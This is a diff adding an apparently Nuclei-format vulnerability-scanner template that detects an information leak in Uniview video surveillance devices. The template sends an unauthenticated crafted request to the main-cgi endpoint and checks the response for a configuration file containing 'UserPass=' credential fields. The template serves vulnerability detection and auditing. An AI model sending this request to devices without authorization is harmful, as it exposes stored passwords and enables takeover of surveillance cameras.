@@ -1,0 +1,24 @@
+id: uniview-video-surveillance-info-leak
+info:
+  name: Uniview Video Surveillance main-cgi Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak, uniview
+http:
+  - method: GET
+    path:
+      - "/cgi-bin/main-cgi?json={%22cmd%22:255,%22szUserName%22:%22%22,%22u32UserLoginHandle%22:-1}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "xml"
+          - "UserPass="
+      - type: word
+        part: header
+        words:
+          - "Config.xml"
